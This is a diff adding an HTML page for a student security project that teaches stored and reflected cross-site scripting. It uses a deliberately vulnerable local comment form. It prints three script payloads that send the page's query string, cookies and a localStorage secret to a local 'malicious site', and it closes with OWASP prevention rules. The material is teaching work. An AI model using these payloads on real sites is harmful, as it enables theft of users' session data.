@@ -1,0 +1,260 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.2/css/bulma.min.css">
+    <title>Vulnerable Site</title>
+
+    <!-- local storage secret -->
+    <script>localStorage.setItem("secret", "this is a secret");</script>
+</head>
+
+<body>
+    <!-- header -->
+    <section class="hero is-dark has-text-centered">
+        <div class="hero-body">
+            <p class="title">
+                Software Security Project
+            </p>
+            <p class="subtitle">
+                Joshua Morrell
+            </p>
+        </div>
+    </section>
+    <section style="display: flex;">
+
+        <!-- left side of screen -->
+        <div style="height: 80vh; width: 50vw; overflow: scroll;">
+            <section class="section">
+                <div class="container">
+
+                    <!-- intro -->
+                    <h1 class="is-size-4">Introduction</h1><br>
+                    <div class="content">
+                        <p>What is Cross Site Scripting? This project is focused on answering that question along with
+                            providing some analysis on how to prevent these types of web based vulnerabilities. There
+                            are two forms of cross site scripting (xss) attacks that this guide will cover,
+                            <strong>reflected xss</strong>, and <strong>stored xss</strong>. <br><br>To demonstrate
+                            these vulnerabilities I have created a vulnerable input in the right half of the screen that
+                            simulates a form input one might find on a social media site or website forum comment
+                            section. A malicious site is also running on <a target="_blank"
+                                href="http://localhost:3001">localhost:3001</a> that will be collecting data taken
+                            throughout the demonstration attacks.
+                        </p>
+                    </div>
+                    <hr>
+
+                    <!-- xss -->
+                    <h1 class="is-size-4">Cross Site Scripting</h1><br>
+                    <div class="content">
+                        <p>Cross site scripting is a form of injection attack where malicious scripts are injected into
+                            webpages. An unsuspecting user can trigger these scripts and because the source web
+                            application is trusted, the user's browser will execute the scripts and access sensitive
+                            information stored in the user's browser. The two methods in which a cross site scripting
+                            attacks can occur are:</p>
+                        <ul>
+                            <li>Data enters a Web application through an untrusted source, most frequently a web
+                                request.</li>
+                            <li>The data is included in dynamic content that is sent to a web user without being
+                                validated for malicious content.</li>
+                        </ul>
+                        <br>
+                        <h6 class="is-size-5">Stored Cross Site Scripting</h6>
+                        <p>Attacks can be delivered in a variety of ways, one of which is by permanently storing a
+                            malicious script in a database or storage of a web application. This attack, also known as
+                            persistent xss, is the most damaging of xss attacks as the malicious script is reused by the
+                            trusted source application and returned to users in valid web requests.</p>
+                        <p>A typical Stored attack proceeds as follows:</p>
+                        <ol>
+                            <li>The attacker visits the vulnerable website and injects the malicious code.</li>
+                            <li>The malicious code is persisted on the server.</li>
+                            <li>The user visits the vulnerable website and runs the malicious code.</li>
+                        </ol>
+                        <br>
+                        <h6 class="is-size-5">Reflected Cross Site Scripting</h6>
+                        <p>Reflected cross site scripting attacks are where an injected script is reflected off of a web
+                            server through unsuspected users. A user might click on a bad link in an email or on a
+                            suspicious webpage and be redirected to a site that they trust. But little do they know that
+                            the link they clicked also includes an embedded script that will take advantage of the
+                            user's
+                            previous interactions with the trusted site.</p>
+                        <p>A typical Reflected attack proceeds as follows:</p>
+                        <ol>
+                            <li>The user visits the attacker's website (or receives an email, etc.) and clicks on a
+                                link.</li>
+                            <li>The user is redirected to the vulnerable website with the malicious code encoded in the
+                                URL parameters.</li>
+                            <li>The user unintentionally injects and runs the malicious code as an effect of visiting
+                                the vulnerable website.</li>
+                        </ol>
+                    </div>
+                    <hr>
+
+                    <!-- demo -->
+                    <h1 class="is-size-4">Demonstration</h1><br>
+                    <div class="content">
+                        <p>Lets quickly go over how this demonstration works. The webpage you are currently on is
+                            considered to be the vulnerable webpage, in which an attacker can inject malicious scripts
+                            and a user can trigger those scripts. The malicious webpage, running on <a target="_blank"
+                                href="http://localhost:3001">localhost:3001</a>, is where a user's data will be
+                            sent once a malicious script has been executed on this webpage. <br><br>Both
+                            webpages are running a node.js server and can be modified by changing the app.js files in
+                            either the /vulnerable-site or /malicious-site directories. It is also worth mentioning that
+                            you may have to refresh or reopen the malicious site after submitting attacks on this site
+                            as
+                            it won't dynamically update on it's own.</p>
+                    </div>
+                    <hr>
+
+                    <!-- stored xss -->
+                    <h1 class="is-size-4">Stored XSS Example</h1><br>
+                    <div class="content">
+                        <p>First let's add a comment to the input form to see how the form acts with normal behavior.</p>
+                        <div class="columns is-centered">
+                            <div class="column is-two-thirds">
+                                <figure class="image box">
+                                    <img src="comment.png" alt="picture of an example comment">
+                                </figure>
+                            </div>
+                        </div>
+                        <p>The other change you might notice is the url now reads something like:</p>
+                        <pre>http://localhost:3000/?comment=This+is+a+comment+on+an+online+forum%21</pre>
+                        <p>As you can see from the url, the form submit sends a new comment request query to the server
+                            along with the text from the comment. If you were to open another instance of <a target="_blank"
+                                href="http://localhost:3000">the vulnerable site</a> in a different tab you would see your
+                            comment persist as the server is storing the value of all comments. But what if instead of text,
+                            an attacker were to send the server an executable script that became stored?</p>
+                        <p>Lets now take on the role of an attacker, instead of entering a comment into the form try
+                            entering this Javascript statement:</p>
+                        <article class="message">
+                            <div class="message-header">
+                                <p>Example 1</p>
+                            </div>
+                            <div class="message-body">
+                                <pre>&ltscript&gtfetch(`http://localhost:3001/?data=${encodeURIComponent(window.location.search)}`)&lt/script&gt</pre>
+                            </div>
+                        </article>
+                        <p>You should see an output something like this:</p>
+                        <div class="columns is-centered">
+                            <div class="column is-two-thirds">
+                                <figure class="image box">
+                                    <img src="example1.png" alt="picture of example 1 comment">
+                                </figure>
+                            </div>
+                        </div>
+                        <p>If you look at both the url and <a target="_blank" href="http://localhost:3001">the malicious site</a> you will see that your request was successful in
+                            sending the url query data to the malicious site. Try opening <a target="_blank"
+                                href="http://localhost:3000">the vulnerable site</a> in a new tab and typing a comment as an
+                            unsuspecting user. After clicking submit, you should see that comment appear in the malicious
+                            site as stolen information!</p>
+                        <div class="columns is-centered">
+                            <div class="column is-two-thirds">
+                                <figure class="image box">
+                                    <img src="example1-1.png" alt="picture of example 1 comment">
+                                </figure>
+                            </div>
+                        </div>
+                        <p>The next two examples are similar in execution but will return
+                            different pieces of information about the user. Try them out and check <a target="_blank" href="http://localhost:3001">the malicious site</a> to see
+                            what data you collect.</p>
+                        <article class="message">
+                            <div class="message-header">
+                                <p>Example 2</p>
+                            </div>
+                            <div class="message-body">
+                                <pre>&ltscript&gtfetch(`http://localhost:3001/?data=${document.cookie}`)&lt/script&gt</pre>
+                            </div>
+                        </article>
+                        <article class="message">
+                            <div class="message-header">
+                                <p>Example 3</p>
+                            </div>
+                            <div class="message-body">
+                                <pre>&ltscript&gtfetch(`http://localhost:3001/?data=${localStorage.getItem("secret")}`)&lt/script&gt</pre>
+                            </div>
+                        </article>
+                        <p>Perhaps you have begun to see the power of this attack. If a website caches some sensitive data
+                            unique to the user, it is now possible for an attacker to manipulate users into sending them the
+                            data without their knowledge.</p>
+                    </div>
+                    <hr>
+
+                    <!-- reflected xss -->
+                    <h1 class="is-size-4">Reflected XSS Example</h1><br>
+                    <div class="content">
+                        <p>Lets now take a look at the workings of a reflected cross site scripting attack. Head over to <a href="http://localhost:3001">the malicious site</a> for a look at an example
+                            of a <strong>reflected xss</strong> attack.</p>
+                    </div>
+                    <hr>
+
+                    <!-- prevention -->
+                    <h1 class="is-size-4">Prevention</h1><br>
+                    <div class="content">
+                        <p>Now that you've seen how these attacks are performed, lets take a look at some prevention
+                            methods. Because cross site scripting attacks are a form of injection attack, the obvious choice
+                            for prevention is some type of input sanitization or validation.</p>
+                        <p>Looking specifically at this application, which you can do as well if you open the app.js file,
+                            one can see that there is no sanitization of the form data in the default route. The</p>
+                        <pre>10|  app.get('/', (req,res)=>{})</pre>
+                        <p>function simply appends the new comment to an array and
+                            replaces a html placeholder with the concatenated array before returning the comments to the
+                            user.
+                        </p>
+                        <p><a target="_blank"
+                                href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP</a>
+                            recommends a few simple rules that will greatly reduce the chances of your application being
+                            vulnerable to cross site scripting attacks.
+                        </p>
+                        <ol>
+                            <li>HTML Encode Before Inserting Untrusted Data into HTML Element Content</li>
+                            <li>Attribute Encode Before Inserting Untrusted Data into HTML Common Attributes</li>
+                        </ol>
+                    </div>
+                </div>
+            </section>
+        </div>
+
+        <!-- right side of screen -->
+        <div style="height: 80vh; width: 50vw; overflow: scroll; border-left: thin solid #363636;">
+
+            <!-- form input -->
+            <section class="section">
+                <div class="columns">
+                    <div class="column">
+                        <h1 class="is-size-4">Vulnerable Input</h1>
+                    </div>
+                    <div class="column is-narrow">
+                        <form action="/reset">
+                            <div class="field level-right">
+                                <p class="control">
+                                    <button type="submit" class="button">Clear Comments</button>
+                                </p>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+                <article class="media">
+                    <div class="media-content">
+                        <form action="/">
+                            <div class="field">
+                                <p class="control">
+                                    <textarea name="comment" class="textarea" placeholder="Add a comment..."></textarea>
+                                </p>
+                            </div>
+                            <div class="field">
+                                <p class="control">
+                                    <button type="submit" class="button">Post Comment</button>
+                                </p>
+                            </div>
+                        </form>
+                    </div>
+                </article>
+                $comments$
+            </section>
+        </div>
+
+    </section>
+</body>
+
+</html>
